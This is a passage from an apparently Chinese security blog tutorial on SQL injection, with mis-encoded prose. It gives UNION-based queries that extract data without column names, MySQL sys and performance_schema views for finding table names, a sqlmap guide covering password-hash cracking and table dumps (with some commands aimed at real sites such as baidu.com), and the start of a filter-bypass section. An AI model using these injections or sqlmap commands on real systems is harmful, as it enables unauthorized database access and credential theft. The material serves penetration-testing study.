<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶åˆ—åå·²ç»æ›´æ”¹ä¸º<code>1,2,3</code></p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c35fa418-6888-471f-8d73-cb270d4f29e7/Untitled.png" alt="Untitled"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br></pre></td></tr></table></figure>

<p>å‰æ–¹åˆ—åè¦åŠ ä¸Šåå¼•å·&#96;&#96;&#96; å¦åˆ™ç»“æœä¸èƒ½æ­£å¸¸è¾“å‡º</p>
<p>åæ–¹è¦åŠ ä¸Šåˆ«å</p>
<p>è‹¥è¿‡æ»¤äº†åå¼•å·ï¼Œåˆ™å¯ä»¥ä½¿ç”¨åˆ«åä»£æ›¿</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b,d <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> d <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br></pre></td></tr></table></figure>

<h3 id="2ã€è·å–æ•°æ®åº“å"><a href="#2ã€è·å–æ•°æ®åº“å" class="headerlink" title="2ã€è·å–æ•°æ®åº“å"></a>2ã€è·å–æ•°æ®åº“å</h3><p>sysè§†å›¾</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_auto_increment_columns`;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_index_statistics`;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_table_statistics`;</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> `sys`.`schema_table_statistics_with_buffer`;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3ã€è·å–è¡¨å"><a href="#3ã€è·å–è¡¨å" class="headerlink" title="3ã€è·å–è¡¨å"></a>3ã€è·å–è¡¨å</h3><p>åœ¨MySQL 5.7.9ä¸­sysä¸­æ–°å¢äº†ä¸€äº›è§†å›¾ï¼Œå¯ä»¥ä»ä¸­è·å–è¡¨å</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>åŒ…å«<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`x$innodb_buffer_stats_by_table` <span class="keyword">where</span> object_schema <span class="operator">=</span> database();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`innodb_buffer_stats_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_index_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_index_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_auto_increment_columns` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>ä¸åŒ…å«<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_flattened_keys` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_table_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$ps_schema_table_statistics_io` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_table_statistics_with_buffer` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_table_statistics_with_buffer` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>é€šè¿‡è¡¨æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„è·å–è¡¨å</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_latency` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`x$io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>performance_schema</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_handles` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br></pre></td></tr></table></figure>

<h3 id="4ã€æŸ¥è¯¢æ•°æ®"><a href="#4ã€æŸ¥è¯¢æ•°æ®" class="headerlink" title="4ã€æŸ¥è¯¢æ•°æ®"></a>4ã€æŸ¥è¯¢æ•°æ®</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br><span class="line"><span class="keyword">select</span> b,d <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> d <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br></pre></td></tr></table></figure>

<h1 id="Vã€SQLMAP"><a href="#Vã€SQLMAP" class="headerlink" title="Vã€SQLMAP"></a>Vã€SQLMAP</h1><p>SQLæ³¨å…¥è‡ªåŠ¨åŒ–ç¥å™¨</p>
<p><a target="_blank" rel="noopener" href="https://sqlmap.org/">sqlmap: automatic SQL injection and database takeover tool</a></p>
<h2 id="ä¸€ã€åŸºæœ¬ä½¿ç”¨"><a href="#ä¸€ã€åŸºæœ¬ä½¿ç”¨" class="headerlink" title="ä¸€ã€åŸºæœ¬ä½¿ç”¨"></a>ä¸€ã€åŸºæœ¬ä½¿ç”¨</h2><ul>
<li><p><strong>æŒ‡å®šç›®æ ‡</strong></p>
<blockquote>
<p>å‚æ•°ï¼š <code>-u [url]</code> æˆ– <code>--url  [url]</code></p>
</blockquote>
<p>  ä½¿ç”¨å‚æ•° -u æˆ– â€“url æŒ‡å®šä¸€ä¸ª URL ä½œä¸ºç›®æ ‡ï¼Œè¯¥å‚æ•°åè·Ÿä¸€ä¸ªè¡¨ç¤º URL çš„å­—ç¬¦ä¸²ï¼Œè¿˜å¯ä»¥æŒ‡å®šç«¯å£ï¼Œå¦‚ï¼š</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;www.baidu.com/user.php?id=7&quot;</span></span><br><span class="line">sqlmap.py -url <span class="string">&quot;www.baidu.com:8080/user.php?id=7&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>ä»æ–‡ä»¶è¯»å–ç›®æ ‡</strong></p>
<blockquote>
<p>å‚æ•°ï¼š<code>-m [filename]</code></p>
</blockquote>
<p>  æ–‡ä»¶ä¸­ä¿å­˜urlæ ¼å¼å¦‚ä¸‹ï¼Œsqlmapä¼šä¸€ä¸ªä¸€ä¸ªæ£€æµ‹</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.target1.com/vuln1.php?q=foobar</span><br><span class="line">www.target2.com/vuln2.asp?id=<span class="number">1</span></span><br><span class="line">www.target3.com/vuln3/id/<span class="number">1</span>*</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>ä»æ–‡ä»¶è½½å…¥ HTTP è¯·æ±‚æµ‹è¯•</strong></p>
<blockquote>
<p>ä½¿ç”¨å‚æ•°ï¼š<code>-r</code></p>
</blockquote>
<p>  å¯ä»¥å¯ä»¥ç†è§£æŠ“ä¸ªåŒ…ä¸‹æ¥ï¼Œè·å– HTTP è¯·æ±‚ç„¶åä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œç„¶åè®© SQLMap è‡ªå·±å»è§£æè¯·æ±‚æ¥è¿›è¡Œæ³¨å…¥æµ‹è¯•ã€‚</p>
<p>  è¿™æ ·å¯ä»¥é¿å…è®¾ç½®å¾ˆå¤šçš„å‚æ•°ï¼Œä¾‹å¦‚POST Cookieç­‰</p>
<p>  å¯ä»¥ä» burp suite ä¸ŠæŠ“åŒ…ä¸‹æ¥é…åˆ SQLMap è¿›è¡Œè”åˆä½¿ç”¨ã€‚</p>
<p>  ä½¿ç”¨<code>*</code>æ ‡è¯†æ³¨å…¥ç‚¹</p>
<p>  å½“è¯·æ±‚æ˜¯HTTPSçš„æ—¶å€™ä½ éœ€è¦é…åˆè¿™ä¸ªâ€“force-sslå‚æ•°æ¥ä½¿ç”¨ï¼Œæˆ–è€…ä½ å¯ä»¥åœ¨Hostå¤´åé¢åŠ ä¸Š:443</p>
</li>
<li><p><strong>æŒ‡å®šæ³¨å…¥ç‚¹ï¼š</strong>*</p>
<p>  SQLMap å¯ä»¥åŒºåˆ†ä¸€ä¸ª URL é‡Œé¢çš„å‚æ•°æ¥è¿›è¡Œæ³¨å…¥ç‚¹æµ‹è¯•ï¼Œä½†åœ¨é‡åˆ°äº†ä¸€äº›åšäº†ä¼ªé™æ€çš„ç½‘é¡µå°±æ— æ³•è‡ªåŠ¨è¯†åˆ«äº†ã€‚</p>
<p>  <code>/admin/1/</code>Â ç±»ä¼¼äºè¿™ç§ï¼ŒSQLMap ä¾¿æ— æ³•è¿›è¡Œæ³¨å…¥æµ‹è¯•ï¼Œä½†å®ƒå®é™…ä¸Šå¯èƒ½æ˜¯è¿™æ ·ï¼šÂ <code>/admin.php?id=1</code></p>
<p>  å®ƒåªæ˜¯æŠŠå‚æ•°éšè—åœ¨äº† URL ä¸­ï¼Œå¯¹äºè¿™ç§ç½‘é¡µï¼Œç›´æ¥åœ¨å‚æ•°ååŠ ä¸Šä¸€ä¸ªæ˜Ÿå·å³å¯ã€‚</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;www.baidu.com/admin/1*&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>POST æ•°æ®</strong></p>
<blockquote>
<p>ä½¿ç”¨å‚æ•°ï¼š<code>-date</code></p>
</blockquote>
<p>  åœ¨ URL åè·Ÿä¸Šä½ è¦æäº¤çš„ POST æ•°æ®ï¼ŒSQLMap ä¹Ÿä¼šå»è‡ªåŠ¨æµ‹è¯•ã€‚</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://baidu.com/admin.php&quot;</span> --data=<span class="string">&quot;id=1&amp;name=admin&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>cookie</strong></p>
<blockquote>
<p>ä½¿ç”¨å‚æ•°ï¼š<code>-cookie</code></p>
</blockquote>
<p>  è¿™ç§æ–¹å¼å¤šåŠæ¥è¿›è¡Œ cookie çš„æ³¨å…¥æ£€æµ‹ï¼Œè®¾ç½®æ¯”è¾ƒç¹çï¼Œä¹Ÿå¯ä»¥ç›´æ¥è®¾ç½®æµ‹è¯•ç­‰çº§ä¸º 3ï¼Œä¼šè‡ªåŠ¨æµ‹è¯•æ˜¯å¦å­˜åœ¨ cookie æ³¨å…¥ã€‚</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://baidu.com/admin.php&quot;</span> --cookie <span class="string">&quot;customerId=591edabaab5b52292042df8a&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>è®¾å®šè¾“å‡ºç­‰çº§ï¼š</strong></p>
<blockquote>
<p>ä½¿ç”¨å‚æ•°ï¼š<code>-v  [0-6]</code></p>
</blockquote>
<p>  V è¿™ä¸ªå‘½ä»¤ï¼Œåœ¨ SQLMap é‡Œå¯ä»¥ç†è§£æˆæ˜¯ä¸€å…±è¾“å‡ºçš„ä¿¡æ¯ï¼Œä»–çš„æµ‹è¯•ç­‰çº§æ˜¯éå¸¸å¤šçš„ï¼Œä¸€å…±åˆ†äº†ä¸ƒä¸ªç­‰çº§å‡ºæ¥ï¼Œè¿™ä¸ƒä¸ªç­‰çº§åœ¨æµ‹è¯•çš„æ—¶å€™ä¼šåœ¨ç•Œé¢é‡Œè¿”å›ä¸åŒçš„å†…å®¹ã€‚</p>
<p>  é»˜è®¤æ˜¯ 1ï¼Œä¹Ÿå¯ä»¥åœ¨å‘½ä»¤åæŒ‡å®š -v 3 å°±æ˜¯ç­‰çº§ 3 çš„è¾“å‡ºã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0ï¼šåªæ˜¾ç¤º Python çš„ tracebacks ä¿¡æ¯ã€é”™è¯¯ä¿¡æ¯ [ERROR] å’Œå…³é”®ä¿¡æ¯ [CRITICAL]ï¼›</span><br><span class="line">1ï¼šåŒæ—¶æ˜¾ç¤ºæ™®é€šä¿¡æ¯ [INFO] å’Œè­¦å‘Šä¿¡æ¯ [WARNING]ï¼›</span><br><span class="line">2ï¼šåŒæ—¶æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ [DEBUG]ï¼›</span><br><span class="line">3ï¼šåŒæ—¶æ˜¾ç¤ºæ³¨å…¥ä½¿ç”¨çš„æ”»å‡»è·è½½ï¼›</span><br><span class="line">4ï¼šåŒæ—¶æ˜¾ç¤º HTTP è¯·æ±‚ï¼›</span><br><span class="line">5ï¼šåŒæ—¶æ˜¾ç¤º HTTP å“åº”å¤´ï¼›</span><br><span class="line">6ï¼šåŒæ—¶æ˜¾ç¤º HTTP å“åº”ä½“ã€‚</span><br></pre></td></tr></table></figure>

<pre><code>æ¨èä½¿ç”¨ 3 ç­‰çº§ï¼Œè¿™æ ·ä¼šç»™å‡º payload
</code></pre>
<ul>
<li><p><strong>è®¾å®šæ‰«æçº§åˆ«ï¼š</strong></p>
<blockquote>
<p>ä½¿ç”¨å‚æ•°ï¼š<code>--level [0-6]</code></p>
</blockquote>
<p>  å…±æœ‰äº”ä¸ªç­‰çº§ï¼Œé»˜è®¤ä¸º1ï¼Œsqlmapä½¿ç”¨çš„payloadå¯ä»¥åœ¨xml&#x2F;payloads.xmlä¸­çœ‹åˆ°ï¼Œä½ ä¹Ÿå¯ä»¥æ ¹æ®ç›¸åº”çš„æ ¼å¼æ·»åŠ è‡ªå·±çš„payloadã€‚</p>
<p>  è¿™ä¸ªå‚æ•°ä¸ä»…å½±å“ä½¿ç”¨å“ªäº›payloadåŒæ—¶ä¹Ÿä¼šå½±å“æµ‹è¯•çš„æ³¨å…¥ç‚¹ï¼ŒGETå’ŒPOSTçš„æ•°æ®éƒ½ä¼šæµ‹è¯•ï¼ŒHTTP Cookieåœ¨levelä¸º2çš„æ—¶å€™å°±ä¼šæµ‹è¯•ï¼ŒHTTP User-Agent&#x2F;Refererå¤´åœ¨levelä¸º3çš„æ—¶å€™å°±ä¼šæµ‹è¯•ã€‚</p>
<p>  æ€»ä¹‹åœ¨ä½ ä¸ç¡®å®šå“ªä¸ªpayloadæˆ–è€…å‚æ•°ä¸ºæ³¨å…¥ç‚¹çš„æ—¶å€™ï¼Œä¸ºäº†ä¿è¯å…¨é¢æ€§ï¼Œå»ºè®®ä½¿ç”¨é«˜çš„levelå€¼ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1ï¼š</span><br><span class="line">2ï¼šHTTP Cookieå¤´æ³¨å…¥ï¼›</span><br><span class="line">3ï¼šHTTP User-Agent/Refererå¤´æ³¨å…¥ï¼›</span><br><span class="line">4ï¼š</span><br><span class="line">5ï¼šå¢åŠ æµ‹è¯•åˆ°50ä¸ªå­—æ®µï¼ˆé»˜è®¤10ï¼‰ï¼›</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>é£é™©ç­‰çº§ï¼š</strong></p>
<blockquote>
<p>å‚æ•°ï¼š<code>--risk</code></p>
</blockquote>
<p>  å…±æœ‰å››ä¸ªé£é™©ç­‰çº§</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1ï¼šä¼šæµ‹è¯•å¤§éƒ¨åˆ†çš„æµ‹è¯•è¯­å¥ï¼ˆé»˜è®¤ï¼‰</span><br><span class="line">2ï¼šä¼šå¢åŠ åŸºäºäº‹ä»¶çš„æµ‹è¯•è¯­å¥</span><br><span class="line">3ï¼šä¼šå¢åŠ ORè¯­å¥çš„SQLæ³¨å…¥æµ‹è¯•</span><br><span class="line">4ï¼š</span><br></pre></td></tr></table></figure>

<pre><code>åœ¨æœ‰äº›æ—¶å€™ï¼Œä¾‹å¦‚åœ¨UPDATEçš„è¯­å¥ä¸­ï¼Œæ³¨å…¥ä¸€ä¸ªORçš„æµ‹è¯•è¯­å¥ï¼Œå¯èƒ½å¯¼è‡´æ›´æ–°çš„æ•´ä¸ªè¡¨ï¼Œå¯èƒ½é€ æˆå¾ˆå¤§çš„é£é™©ã€‚

æµ‹è¯•çš„è¯­å¥åŒæ ·å¯ä»¥åœ¨xml/payloads.xmlä¸­æ‰¾åˆ°ï¼Œä¹Ÿå¯ä»¥è‡ªè¡Œæ·»åŠ payloadã€‚
</code></pre>
<ul>
<li><p><strong>æ³¨å…¥æŠ€æœ¯</strong></p>
<blockquote>
<p>å‚æ•°ï¼š<code>--technique</code></p>
</blockquote>
<p>  è¿™ä¸ªå‚æ•°å¯ä»¥æŒ‡å®šsqlmapä½¿ç”¨çš„æ¢æµ‹æŠ€æœ¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šæµ‹è¯•æ‰€æœ‰çš„æ–¹å¼ã€‚</p>
<p>  æ”¯æŒçš„æ¢æµ‹æ–¹å¼å¦‚ä¸‹ï¼š</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B: Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰</span><br><span class="line">E: <span class="built_in">Error</span>-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰</span><br><span class="line">U: UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰</span><br><span class="line">S: Stacked queries SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥)</span><br><span class="line">T: Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>ç”¨æˆ·</strong></p>
<blockquote>
<p>å‚æ•°ï¼š<code>--current-user</code></p>
</blockquote>
<p>  åœ¨å¤§å¤šæ•°æ®åº“ä¸­å¯ä»¥è·å–åˆ°ç®¡ç†æ•°æ®çš„ç”¨æˆ·ã€‚</p>
</li>
<li><p><strong>å½“å‰æ•°æ®åº“</strong></p>
<blockquote>
<p>å‚æ•°ï¼š<code>--current-db</code></p>
</blockquote>
<p>  è¿”è¿˜å½“å‰è¿æ¥çš„æ•°æ®åº“ã€‚</p>
</li>
<li><p><strong>å½“å‰ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜</strong></p>
<p>  å‚æ•°ï¼š<code>--is-dba</code></p>
<p>  åˆ¤æ–­å½“å‰çš„ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†ï¼Œæ˜¯çš„è¯ä¼šè¿”å›Trueã€‚</p>
</li>
<li><p><strong>åˆ—æ•°æ®åº“ç®¡ç†ç”¨æˆ·</strong></p>
<blockquote>
<p>å‚æ•°ï¼š<code>--users</code></p>
</blockquote>
<p>  å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰ç”¨æˆ·çš„è¡¨çš„æƒé™æ—¶ï¼Œå°±å¯ä»¥åˆ—å‡ºæ‰€æœ‰ç®¡ç†ç”¨æˆ·ã€‚</p>
</li>
<li><p><strong>åˆ—å‡ºå¹¶ç ´è§£ç”¨æˆ·hash</strong></p>
<blockquote>
<p>å‚æ•°ï¼š<code>--passwords</code></p>
</blockquote>
<p>  å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«ç”¨æˆ·å¯†ç è¡¨çš„æƒé™æ—¶ï¼Œsqlmapä¼šåˆ—ä¸¾å‡ºç”¨æˆ·ï¼Œç„¶ååˆ—å‡ºhashï¼Œå¹¶å°è¯•ç ´è§£ã€‚</p>
</li>
<li><p>**åˆ—åº“Â ****<code>dbs</code>**</p>
<blockquote>
<p>å‚æ•°ï¼šÂ <code>--dbs</code></p>
</blockquote>
<p>  åˆ—å‡ºå½“å‰æ•°æ®åº“ç³»ç»Ÿä¸­çš„æ•°æ®åº“</p>
</li>
<li><p>**åˆ—è¡¨Â ****<code>tables</code>**</p>
<blockquote>
<p>å‘½ä»¤æ˜¯Â <code>-D [æ•°æ®åº“å] --tables</code></p>
</blockquote>
<p>  åˆ—å‡ºæŒ‡å®šçš„æ•°æ®åº“çš„è¡¨ï¼Œè‹¥æ˜¯ä¸ä½¿ç”¨-Då‚æ•°æ¥æŒ‡å®šä¸€ä¸ªæ•°æ®åº“æ—¶ï¼Œsqlmapä¼šåˆ—å‡ºæ•°æ®åº“æ‰€æœ‰åº“çš„æ‰€æœ‰è¡¨ã€‚</p>
</li>
<li><p>**åˆ—å‡ºè¡¨ä¸­å­—æ®µÂ ****<code>columns</code>**</p>
<blockquote>
<p>å‚æ•°ï¼šÂ <code>-D [æ•°æ®åº“å] -T [è¡¨å] --columns</code></p>
</blockquote>
<p>  å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰æ•°æ®åº“è¡¨ä¿¡æ¯çš„è¡¨ä¸­çš„æ—¶å€™ï¼Œå³å¯åˆ—å‡ºæŒ‡å®šæ•°æ®åº“è¡¨ä¸­çš„å­—æ®µï¼ŒåŒæ—¶ä¹Ÿä¼šåˆ—å‡ºå­—æ®µçš„æ•°æ®ç±»å‹ã€‚</p>
<p>  å¦‚æœæ²¡æœ‰ä½¿ç”¨-Då‚æ•°æŒ‡å®šæ•°æ®åº“æ—¶ï¼Œé»˜è®¤ä¼šä½¿ç”¨å½“å‰æ•°æ®åº“ã€‚</p>
</li>
<li><p><strong>åˆ—ä¸¾æ•°æ®åº“ç³»ç»Ÿçš„æ¶æ„</strong></p>
<blockquote>
<p>å‚æ•°ï¼š<code>--schema --exclude-sysdbs</code></p>
</blockquote>
<p>  ç”¨æˆ·å¯ä»¥ç”¨æ­¤å‚æ•°è·å–æ•°æ®åº“çš„æ¶æ„ï¼ŒåŒ…å«æ‰€æœ‰çš„æ•°æ®åº“ï¼Œè¡¨å’Œå­—æ®µï¼Œä»¥åŠå„è‡ªçš„ç±»å‹ã€‚</p>
<p>  åŠ ä¸Šâ€“exclude-sysdbså‚æ•°ï¼Œå°†ä¸ä¼šè·å–æ•°æ®åº“è‡ªå¸¦çš„ç³»ç»Ÿåº“å†…å®¹ã€‚</p>
</li>
<li><p><strong>è·å–è¡¨ä¸­æ•°æ®ä¸ªæ•°</strong></p>
<blockquote>
<p>å‚æ•°ï¼š<code>--count</code></p>
</blockquote>
<p>  æœ‰æ—¶å€™ç”¨æˆ·åªæƒ³è·å–è¡¨ä¸­çš„æ•°æ®ä¸ªæ•°è€Œä¸æ˜¯å…·ä½“çš„å†…å®¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‚æ•°ã€‚</p>
</li>
<li><p><strong>è·å–æ•´ä¸ªè¡¨çš„æ•°æ®</strong></p>
<blockquote>
<p>å‚æ•°ï¼š<code>--dump -C [åˆ—å] -T [è¡¨å] -D [æ•°æ®åº“å]</code></p>
</blockquote>
<p>  å¦‚æœå½“å‰ç®¡ç†å‘˜æœ‰æƒé™è¯»å–æ•°æ®åº“å…¶ä¸­çš„ä¸€ä¸ªè¡¨çš„è¯ï¼Œé‚£ä¹ˆå°±èƒ½è·å–è¿™ä¸ªè¡¨çš„æ‰€æœ‰å†…å®¹ã€‚</p>
<p>  ä½¿ç”¨-D,-Tå‚æ•°æŒ‡å®šæƒ³è¦è·å–å“ªä¸ªåº“çš„å“ªä¸ªè¡¨ï¼Œä¸é€‚ç”¨-Då‚æ•°æ—¶ï¼Œé»˜è®¤ä½¿ç”¨å½“å‰åº“ã€‚</p>
</li>
</ul>
<h1 id="VIã€æ³¨å…¥ç»•è¿‡"><a href="#VIã€æ³¨å…¥ç»•è¿‡" class="headerlink" title="VIã€æ³¨å…¥ç»•è¿‡"></a>VIã€æ³¨å…¥ç»•è¿‡</h1><h3 id="1ã€ç»•è¿‡ç©ºæ ¼"><a href="#1ã€ç»•è¿‡ç©ºæ ¼" class="headerlink" title="1ã€ç»•è¿‡ç©ºæ ¼"></a>1ã€ç»•è¿‡ç©ºæ ¼</h3><p><strong>ä½¿ç”¨URLç¼–ç çš„ç‰¹æ®Šå­—ç¬¦ ï¼š</strong></p>
<p><code>%20</code> ï¼šç©ºæ ¼</p>
<p><code>%09</code> ï¼šTAB(æ°´å¹³)</p>
